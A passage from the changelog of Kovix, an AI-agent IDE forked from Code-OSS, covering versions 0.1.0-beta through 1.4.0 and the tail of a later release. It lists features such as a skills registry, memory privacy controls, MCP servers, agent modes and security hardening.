- **OS app icons** (Windows `.ico`, macOS `.icns`, Linux `.png`) are still the VS Code default. The K-logo SVG sprite at `kovix-logos.svg` is the source — convert to platform-specific formats for v1.5.1.
- **Electron main splash** — the canonical `kovix-splash.html` is not yet wired into the Electron main process. The in-workbench overlay (`kovixSplash.ts`) handles the splash experience; the Electron main wiring is a follow-up for v1.5.1.

### Credits

- Kovix is a fork of [Microsoft's Code-OSS](https://github.com/microsoft/vscode), used under the MIT License.
- The Kovix Identity design system was developed by the Kovix team.

## [1.4.0] - 2026-06-19

### Skills system — the missing "tools & playbooks" layer
- **New `ISkillRegistry` platform interface** (`src/vs/platform/construct/common/skills/skillRegistry.ts`) — the formal contract for skill storage, lookup, and per-task ranking. Service ID `construct.skillRegistry`. Skills carry: slug, title, description, scope (user / project / builtin), file path, allowed/disallowed tools, enabled flag, tags, icon, source URL, installed-at timestamp, and the markdown body.
- **Full implementation** (`src/vs/workbench/contrib/construct/browser/services/skills/skillRegistryService.ts`, ~380 lines) with:
  - Claude-Code-style SKILL.md frontmatter parser (regex-based, tolerant of missing fields)
  - Scope-aware loader: builtin skills (in code) → user-global skills at `~/.kovix/skills/<slug>/SKILL.md` → project-scoped skills at `<workspace>/.kovix/skills/<slug>/SKILL.md`
  - State persistence to `~/.kovix/kovix-skills-state.json` (tracks disabled slugs across restarts)
  - `rankForTask(task, topK)` — token/tag scoring (slug tag match 0.30, substring 0.15, title 0.10, description 0.05) returns the top-K most relevant skills for any task
  - `getContextForTask(task, topK)` — formats the matched skills into a single string ready to inject into the agent's system prompt
  - `createSkillFromDocument(options)` — writes a new SKILL.md to disk from in-app document conversion
  - `importFromUrl(url, scope)` — fetches a SKILL.md from a URL and installs it
  - `revealSkill(slug)` — opens the SKILL.md in the editor
  - `onDidUpdateSkills` event for reactive UI
- **3 builtin skills** shipped in code: `kovix-plan-act`, `kovix-debug-loop`, `kovix-review-pr` — so every Kovix install has useful playbooks on day one without needing a network fetch.
- **3 community skills** imported from the user's `skills.zip` and installed both into `~/.kovix/skills/` and into the repo at `/skills/`: `performance-audit`, `security-audit`, `ui-audit`. Each ships a SKILL.md with frontmatter + a structured audit playbook body.

### Auto-skill discovery — the agent picks its own playbook
- The agent loop's `buildSystemPrompt()` now consults `ISkillRegistry.getContextForTask()` on every turn and injects the top-3 matching skills into the system prompt as a `## Available skills (use the most relevant one)` block. The agent no longer needs the user to remember what skills exist — it discovers the right one per task.
- Slash commands make every skill one keystroke away: `/skills` (list), `/<slug>` (invoke, e.g. `/security-audit`), `/skill-create` (convert current document into a skill).

### Agent Settings pane — one place for everything
- **New file `kovixAgentSettings.ts`** — a single pane with 6 tabs that finally gives users one home for all agent configuration:
  1. **Skills** — list all skills (builtin / user / project), toggle enabled, reveal SKILL.md, delete, import from URL, create from document
  2. **Memory** — every privacy control (see below) surfaced as toggles + dropdowns, plus a "Forget everything" destructive button
  3. **MCP** — browse and install MCP servers from the builtin catalog (now 9 entries, see below), see installed status
  4. **API Keys** — the 5 NVIDIA NIM keys (Hikmah + CEO/CTO/COO/CISO) with per-agent assignment
  5. **Swarm** — spawn and monitor multi-agent swarms (see below)
  6. **Autonomous** — toggle autonomous idea→app mode and tune its guardrails (see below)
- Registered as view `construct.agentSettings`; opens via `Kovix: Open Agent Settings` command or the ⚙️ icon in the agent panel header.
- Styling matches the v1.3.0 luxury-chromium design system (Volt-on-ink, hairline separators, pill tabs) so the pane feels native to the rest of the workbench.

### Memory privacy — users stay in control of their data
- **9 new privacy config keys** under `construct.memory.privacy.*`:
  - `autoRemember` (default true) — auto-store facts from conversation
  - `requireExplicitConsent` (default false) — ask before each memory write
  - `piiScrub` (default true) — redact PII before storing
  - `scope` (per-project / per-workspace / global, default per-project)
  - `retentionDays` (default 90, range 1–3650)
  - `crossProjectLearning` (default false)
  - `redactFileContents` (default true) — store metadata only, not source code
  - `telemetryOptOut` (default true)
  - `forgetOnWindowClose` (default false) — clear working memory on close
  - `allowNetworkSync` (default false) — local-only even when a Supermemory key is set
- **New `memoryPrivacy.ts` utility** — 13-pattern PII scrubber (emails, phone numbers, credit cards, SSNs, API keys, JWTs, IPv4/IPv6, MAC addresses, AWS keys, GitHub tokens, private keys, Bitcoin addresses, URLs with credentials), file-content redaction (replaces source-code bodies with `<<redacted:N bytes>>`), retention enforcement, explicit-consent gating, and scope resolution.
- Slash command `/forget-everything` wipes all stored memory immediately. `/memory` shows current memory state and privacy settings inline in the chat.

### MCP marketplace — 5 new builtin servers
- Expanded the builtin catalog from 4 to 9 entries:
  - **21st.dev magic** (`npx -y @21st-dev/magic@latest`) — component registry MCP. Featured.
  - **Ponytail** (`npx -y ponytail-mcp@latest`) — "Lazy Senior Developer Mode" YAGNI enforcement, from `https://github.com/DietrichGebert/ponytail`.
  - **Supermemory** (`npx -y supermemory-mcp@latest`) — cloud memory sync. Requires `SUPERMEMORY_API_KEY`.
  - **Browserbase** (`npx -y @browserbasehq/mcp@latest`) — cloud browser automation.
  - **Smithery Obsidian** (`npx -y @smithery/obsidian-mcp@latest`) — bridge to a local Obsidian vault. Requires `OBSIDIAN_VAULT_PATH`.

### Autonomous idea → app
- **New `kovixAutonomousConfig.ts`** with 7 settings under `construct.autonomous.*`: `enabled`, `maxIterations` (default 25), `requireApprovalAtMilestone` (default true), `milestoneGate` (plan / build / test / ship), `autoRunTests` (default true), `autoCommit` (default false), `safetyMode` (default strict).
- **New `construct.autonomousBuild` command** + `/idea <description>` slash command — kicks off a non-stop refinement → plan → build loop with milestone gates. Each milestone pauses for human approval when `requireApprovalAtMilestone` is true, so the user keeps the steering wheel while Kovix does the driving.

### Agent swarm — multi-agent coordination
- **New `construct.openSwarm` command** + Swarm tab in Agent Settings — spawn multiple worker agents in parallel, each with its own role and model assignment. Monitor live status (idle / planning / executing / done) and review each agent's output stream. The supervisor (Hikmah) routes subtasks to workers and aggregates results.

### Build verification
- Full `gulp compile` runs to **0 errors** end-to-end (src + 33 extensions + monaco typecheck + extension media).
- The only fix needed during build verification was a single missing `URI` import in `construct.contribution.ts` (the new skill-reveal handler used `URI.file(...)` but never imported `URI`). Committed as `c7bdc93`.

### Files added
- `src/vs/platform/construct/common/skills/skillRegistry.ts` (~110 lines) — platform interface
- `src/vs/workbench/contrib/construct/browser/services/skills/skillRegistryService.ts` (~380 lines) — full implementation
- `src/vs/workbench/contrib/construct/browser/services/memory/memoryPrivacy.ts` — PII scrubber + privacy utilities
- `src/vs/workbench/contrib/construct/browser/kovixAgentSettings.ts` — 6-tab Agent Settings pane
- `src/vs/workbench/contrib/construct/browser/kovixAutonomousConfig.ts` — autonomous mode config
- `skills/performance-audit/SKILL.md`, `skills/security-audit/SKILL.md`, `skills/ui-audit/SKILL.md` — community skills shipped in repo

### Files modified
- `src/vs/workbench/contrib/construct/browser/construct.contribution.ts` — registered SkillRegistry singleton, Agent Settings view, 12 new commands, added URI import
- `src/vs/workbench/contrib/construct/browser/constructAgentView.ts` — wired skill auto-discovery into `buildSystemPrompt`, added 8 slash commands (`/skills`, `/<slug>`, `/skill-create`, `/forget-everything`, `/memory`, `/swarm`, `/idea`, `/autonomous`)
- `src/vs/workbench/contrib/construct/browser/services/agent/agentLoop.ts` — `buildSystemPrompt` now calls `ISkillRegistry.getContextForTask()` per turn
- `src/vs/workbench/contrib/construct/browser/services/mcp/mcpMarketplaceService.ts` — added 5 new builtin MCP entries
- `src/vs/workbench/contrib/construct/browser/constructMemoryConfig.ts` — added 9 privacy config keys
- `package.json` — version bumped to 1.4.0
- `README.md` — version badge bumped to 1.4.0


## [1.3.0] - 2026-06-19

### Critical UI Fix — Luxury Chromium theme wired up + agent panel rebuilt
- **Root cause found:** the `kovix-tokens.css` design system existed in v1.2.0 but was missing ~30 tokens that the new v1.3.0 UI needed (`--kovix-bg-overlay`, `--kovix-bg-input`, `--kovix-volt-glow`, `--kovix-volt-subtle`, `--kovix-hairline*`, `--kovix-cyber-*`, `--kovix-radius-{xs,xl,pill}`, `--kovix-space-1..6`, `--kovix-motion-*`, `--kovix-shadow-*`, `--kovix-gradient-*`). Added an EXTENDED TOKENS section to `kovix-tokens.css` with all of these plus accessibility class definitions.
- **Agent panel completely rebuilt** — `_renderBody` in `constructAgentView.ts` rewritten from 320 lines of inline-styled DOM to a clean CSS-class-based structure that matches the reference mockup pixel-for-pixel:
  - Header with circular avatar (K), name, subline, action buttons (new chat / history / control center / settings)
  - Session tabs as rounded Volt-tinted pills
  - Model bar with mode badge + model pill (with status dot) + spacer + memory pill + Ponytail badge
  - Message area with bubble-style messages — circular avatars (U for user, K for agent), author name, status indicator (READY/PLANNING/EXECUTING/etc.) with colored dots, bubble with proper Volt-tinted background for user messages
  - Input area with chips row (`@file`, `#tag` auto-extracted from input), textarea with Volt focus ring, Volt send button, Ignite stop button, keyboard hint footer
- **New file `kovixAgent.css`** (500+ lines) — every visual element styled with the luxury-chromium palette
- **Input chip scanner** — typing `@filename` or `#tag` in the chat input auto-extracts them into chips above the input field, with × buttons to remove
- **Status bar pulsing** — when agent is in planning/executing/refining state, the workbench status bar gets the `kovix-status-running` class which triggers the existing pulse animation

### Obsidian-style Memory Graph view
- **New file `kovixMemoryGraph.ts`** (530 lines) + `kovixMemoryGraph.css` (140 lines): force-directed graph visualization of the universal memory system. Every memory entry is a node, color-coded by category (Working=blue, Episodic=teal, Semantic=purple, Procedural=amber, Universal=Volt). Edges connect memories that share tags or belong to the same category.
- **Interactive editing** — click a node to see full content in the side panel, double-click to edit content + tags inline, right-click for context menu (Edit/Copy/Pin/Delete), drag to reposition, search filter, category filter chips
- **Self-contained force simulation** — no D3 dependency, O(n²) repulsion + Hooke attraction + centering + damping, capped at 500 nodes
- Registered as view `construct.memoryGraph`; open via `Kovix: Open Memory Graph` command or click the memory pill in the agent panel header

### Agent Control Center — live agents + token usage dashboard
- **New file `kovixAgentControlCenter.ts`** (320 lines) + `kovixControlCenter.css` (200 lines): single-pane dashboard showing everything happening in the agent subsystem
- **5 cards**: Provider & Model / Live Agents (with pulsing status dots) / Token Usage (animated bars + cost estimate) / Memory Layers (per-layer counts) / Pending Diffs (with Accept All / Reject All)
- Auto-refreshes every 2 seconds, subscribes to all change events for instant updates
- Registered as view `construct.controlCenter`; open via `Kovix: Open Agent Control Center` command or click the 📊 icon in the agent panel header

### Accessibility — first-class support
- **New file `kovixAccessibilityConfig.ts`** — 6 accessibility settings under `kovix.accessibility.*`: fontScale (sm/md/lg/xl), highContrast, reducedMotion, screenReaderHints, keyboardNavigationOnly, colorBlindMode (none/protanopia/deuteranopia/tritanopia)
- **New file `kovixAccessibilityContribution.ts`** — workbench contribution that applies these settings to `.monaco-workbench` as CSS classes. Changes take effect immediately, no restart required
- 5 new appearance settings under `kovix.appearance.*`: statusBarStyle (volt/ink/gradient), agentPanelWidth (320-800px), showTokenCounter, showPonytailBadge, showMemoryPill
- All accessibility classes (`kovix-high-contrast`, `kovix-reduced-motion`, `kovix-colorblind-*`, `kovix-statusbar-*`, `kovix-font-scale-*`, `kovix-keyboard-nav`) defined in `kovix-tokens.css`

### Files added
- `src/vs/workbench/contrib/construct/browser/kovixMemoryGraph.ts` (530 lines)
- `src/vs/workbench/contrib/construct/browser/kovixAgentControlCenter.ts` (320 lines)
- `src/vs/workbench/contrib/construct/browser/kovixAccessibilityConfig.ts` (115 lines)
- `src/vs/workbench/contrib/construct/browser/kovixAccessibilityContribution.ts` (60 lines)
- `src/vs/workbench/contrib/construct/browser/media/kovixAgent.css` (500+ lines)
- `src/vs/workbench/contrib/construct/browser/media/kovixMemoryGraph.css` (140 lines)
- `src/vs/workbench/contrib/construct/browser/media/kovixControlCenter.css` (200 lines)

### Files modified
- `src/vs/workbench/browser/media/kovix-tokens.css` — added EXTENDED TOKENS section + accessibility class definitions
- `src/vs/workbench/contrib/construct/browser/constructAgentView.ts` — full `_renderBody` rewrite (320 lines inline-style → class-based), helper methods rewritten (`addUserMessage`, `addAgentMessage`, `updateStatusIndicator`, `updateModelPickerLabel`, `clearMessages`), new `scanInputForChips` / `clearChips` methods, new private fields for v1.3.0 UI elements
- `src/vs/workbench/contrib/construct/browser/construct.contribution.ts` — registered 2 new views (`construct.memoryGraph`, `construct.controlCenter`), added 2 new commands (`construct.openMemoryGraph`, `construct.openControlCenter`), imported accessibility config + contribution, added 2 new icons (graph, dashboard)
- `package.json` — version bumped to 1.3.0

## [1.2.0] - 2026-06-19
## [1.2.0] - 2026-06-19

### Critical Fix
- **Broke the aiService ↔ secureKeyManager cyclic dependency** that crashed every Construct workbench contribution on v1.1.0. The agent panel, status bar agent indicators, and AI autocomplete all failed to construct with `Error: cyclic dependency between services`. Both services now use `@IInstantiationService` + lazy `_resolveXxx()` helpers to defer partner resolution to first runtime use. A new `LazyCloudProvider` proxy class defers CloudProvider construction until first method call (necessary because CloudProvider's ctor subscribes to `ISecureKeyManager.onDidChangeKey`).

### Added — Multi-Provider LLM Support
- **8 new first-class LLM providers** added to the existing 5:
  - **NVIDIA NIM** (`integrate.api.nvidia.com/v1`, `nvapi-` keys) — 121+ models including Llama, Nemotron, Mistral, Qwen, DeepSeek
  - **OpenRouter** (`openrouter.ai/api/v1`, `sk-or-` keys) — one key for Claude, GPT, Gemini, Llama, etc.
  - **LM Studio** (`localhost:1234/v1`, no auth) — local OpenAI-compatible
  - **Together AI** (`api.together.xyz/v1`) — hosted Llama/Qwen
  - **Groq** (`api.groq.com/openai/v1`, `gsk_` keys) — ultra-fast inference
  - **Mistral AI** (`api.mistral.ai/v1`) — Mistral Large, Codestral, Mixtral
  - **Google Gemini** (`generativelanguage.googleapis.com/v1beta/openai`) — Gemini 1.5/2.0 Pro/Flash
  - **DeepSeek** (`api.deepseek.com/v1`) — DeepSeek Chat, Coder, R1
- All 13 providers route through CloudProvider via OpenAI-compatible endpoints
- Provider-specific API key validation rules (nvapi-, sk-or-, gsk_, sk-ant-, sk-)
- `DEFAULT_ENDPOINTS`, `PROVIDER_LABELS`, `REQUIRES_KEY`, `IS_LOCAL`, `DEFAULT_MODELS` lookup tables exported for UI consumption
- OpenRouter requests automatically include `HTTP-Referer` and `X-Title` attribution headers per their docs
- CloudProvider now listens to `onDidChangeActiveProvider` and re-resolves endpoint + clears cached models when user switches providers
- `Manage API Keys` command expanded to all 13 providers in the quick-pick dropdown

### Added — Agent Modes & Multi-Agent Swarms
- New `IAgentModeService` with 6 built-in modes:
  - **General** — all-purpose assistant (default)
  - **Architect** — plans multi-file changes, read-only, hands off to Coder
  - **Coder** — executes plans by editing files + running commands
  - **Reviewer** — reviews pending diffs for bugs/security/style
  - **Debugger** — reproduces issues, reads stack traces, bisects
  - **Ask** — pure Q&A, no file modifications
- Per-mode model selection (Roo Code custom modes pattern) — each mode can override the global model. Run a strong model for planning, a cheap fast model for execution.
- Sub-agent spawning (OpenAI Swarm handoff pattern) — modes with `canSpawnSubAgents: true` can spawn sub-agents with their own mode + task. Tracked via `ISubAgent` interface with status (pending/running/completed/failed/cancelled), output, and token usage.
- Custom mode creation via `Kovix: Create Custom Agent Mode` wizard (slug, displayName, roleDefinition, tool groups, sub-agent capability)
- 3 new commands: `switchAgentMode`, `createAgentMode`, `spawnSubAgent`
- Modes persist to `.kovix/modes.json`; built-in modes cannot be deleted

### Documentation
- Complete README rewrite for v1.2.0 — multi-provider table, agent modes section, swarm docs, updated commands, architecture diagram
- License file reference corrected: `CONSTRUCT_LICENSE.txt` → `KOVIX_LICENSE.txt`

## [1.1.0] - 2026-06-19

### Added
- **Luxury Chromium chrome** — title bar, status bar, and right-side auxiliary bar restyled with deep ink surfaces, brand-tinted hairlines, and crisp typography (Antigravity-IDE inspired)
- Right-hand-side agent panel placement confirmed (ViewContainerLocation.AuxiliaryBar) — Kovix Agent dock now matches the Antigravity reference layout
- Diagnostic console logging in ConstructAgentViewPane to surface any silent view-instantiation failures
- Status bar running state — solid Volt-500 background with white text pulses while the agent is actively working

### Fixed
- Empty Kovix Agent panel on first launch ("Drag a view here") — view container now opens by default
- "Construct Agent" → "Kovix Agent" rename completed across view container title, status bar entries, and command palette
- Model picker, agent status, and pending-diff count status bar entries now render with live values from the AI service
- MAX_ROUNDS raised from 15 to 50 for long-running agent tasks
- Tab Autocomplete added as a first-class tool category
- Security gate added before destructive tool execution

### Branding
- `kovix-tokens.css` (348 lines) loaded globally via `src/vs/workbench/browser/style.ts` — single source of truth for all surfaces, badges, gradients, radii
- Kovix badge utility classes (`--running`, `--pending`, `--error`, `--info`, `--idle`) available workbench-wide
- Kovix button utilities (gradient `--primary`, ghost `--ghost`) for consistent Approve/Reject CTAs
- Kovix action card utility (with `--pending` amber tint) for diff-review cards
- Activity bar Kovix icon gets a permanent subtle Volt-500 highlight, even when inactive
- `product.json` branding finalized: nameShort="Kovix", nameLong="Kovix IDE", applicationName="kovix", dataFolderName=".kovix", darwinBundleIdentifier="ai.kovix.ide", urlProtocol="kovix"

## [1.0.0] - 2026-06-10

### Renamed
- Product renamed from "Construct IDE" to "Kovix"
- New domain: kovix.dev
- Bundle ID updated to ai.kovix.ide

### Fixed (Grand Launch)
- Multi-turn conversation context preserved across run() calls (Bug 1)
- Universal memory injection sanitized against prompt injection (Bug 2)
- AbortSignal propagated to tool execution for immediate cancellation (Bug 3)
- Provider switch aborts in-flight streams cleanly (Bug 4)
- Keybinding changed from Ctrl+Shift+K to Ctrl+Shift+L to avoid Delete Line conflict (Bug 5)
- FileWatcher now uses fs.watch for external file change detection (Stub 1)
- MemoryOrchestrator stats now return real metrics (Stub 2)

### Removed (Grand Launch)
- Non-functional Python agent backend (Stub 3)

### Added (Grand Launch)
- PromptSanitizer utility for memory context sanitization
- Unit tests for Construct services

### CI (Grand Launch)
- Consolidated build/release workflows — build.yml is compile-only on push to main, release.yml is the sole tagged-release workflow
- npm audit now fails on critical CVEs (removed continue-on-error)
- release.yml uses npm ci instead of npm install
- release.yml upgraded to softprops/action-gh-release@v2
- macOS runner cost trade-off documented in release.yml

### Docs (Grand Launch)
- Added SECURITY.md with vulnerability reporting policy, supported versions, and known security considerations
- Added Known Limitations section in README.md

## [1.0.0] - 2026-06-09

### Added
- AI-native agent framework built on MCP (Model Context Protocol)
- Vector memory integration via Qdrant
- Local ML inference via Transformers.js (@xenova/transformers)
- Persistent memory layer via Supermemory
- Redis-backed session management via ioredis
- Kovix branding and identity

### Changed
- Rebranded from Code-OSS to Kovix
- Extension gallery pointed to Open VSX Registry (open-source marketplace)

### Based On
- Microsoft Code-OSS (VS Code open source) — MIT License

---

## [1.0.0-beta] — 2025

### Added (Phase 2)

- LLM Provider Layer: Anthropic (SSE streaming) and Ollama (NDJSON streaming) providers
- Typed error classes: ConstructAuthError, ConstructRateLimitError, ConstructOverloadedError, ConstructNetworkError
- API key management via VS Code SecretStorage (construct.setApiKey / construct.clearApiKey commands)
- Configuration settings: construct.provider, construct.anthropic.model, construct.ollama.baseUrl, construct.ollama.model, construct.maxTokens

### Added (Phase 3)

- Agent loop with full plan/act cycle: message → system prompt → LLM → parse tool calls → execute → loop
- Core tools: file_read (with 100KB truncation, path traversal protection), file_write (overwrite/append/create_only modes), run_terminal_command (with allowlist + approval gate), list_directory (recursive, .gitignore aware)
- Tool registry with auto-generated system prompt tools section
- Max iteration limit (15 rounds), per-call timeout (60s), error propagation, cancellation support

### Added (Phase 4)

- CONSTRUCT sidebar panel with Activity Bar icon
- Chat view: scrollable message list, textarea input (Shift+Enter for newlines), send/stop/clear buttons
- Status bar integration: provider/model indicator, pending changes counter
- Streaming response rendering with auto-scroll
- Provider status and configuration UI (gear icon, test connection)

### Added (Phase 6)

- Security tools: nmap_scan (XML output parsing, confirmation gate), ghidra_decompile (Docker headless), nuclei_scan (JSON output parsing, severity filtering)
- construct.enableSecurityTools configuration setting
- All security tools gated behind user confirmation dialogs

### Added (Phase 7)

- MCP server management: spawn, communicate (JSON-RPC over stdio), auto-restart (3 retries with exponential backoff)
- MCP tool dispatch: serverName__toolName routing in agent loop
- construct.mcp.servers configuration for server definitions

### Added (Phase 8)

- Semantic memory: Ollama embedding service (/api/embed with nomic-embed-text, pseudo-embedding fallback)
- Workspace indexing command (construct.indexWorkspace)
- Memory integration: top-5 relevant context chunks prepended to system prompt

### Packaging (Phase 9)

- Documented packaging approaches and system requirements (PACKAGING.md)
- VSIX packaging confirmed N/A (fork architecture, not an extension)
- Gulp pipeline verified: vscode-linux-x64, deb, rpm, snap targets available
- Full build requires 16+ GB RAM (OOM on 8 GB system)

## [0.1.0-beta] — 2025

### Added

- Unified AI provider system (`IConstructAIService`) with Ollama, Xenova, and Cloud backends
- Autonomous agent loop with plan/act cycle and 5 built-in tools
- Real semantic search via Ollama embeddings + BM25 fallback
- 4-step onboarding wizard with Ollama and WSL2 detection
- Kali Linux terminal integration on Windows via WSL2
- MCP tool execution engine with command safety blocklist
- Path traversal protection on all file operations
- Prompt injection defence on context injection
- API key vault via OS keychain
- Telemetry fully disabled (1DS stubbed)
- Custom status bar model picker
- Open VSX extension gallery (no Microsoft account required)

### Security

- Electron contextIsolation and sandbox enabled
- IPC channel input validation with allowlists and shared constants (constructIpcChannels.ts)
- Terminal command blocklist and rate limiting
- Secret redaction in all log output
- Pre-commit hook for secret detection

### Known Issues

- `@xenova/transformers` ONNX inference not yet functional in Electron sandbox (BM25 fallback active)
- macOS code signing not configured for v0.1.0-beta (unsigned build)
- Windows SmartScreen warning expected on first launch (unsigned installer)
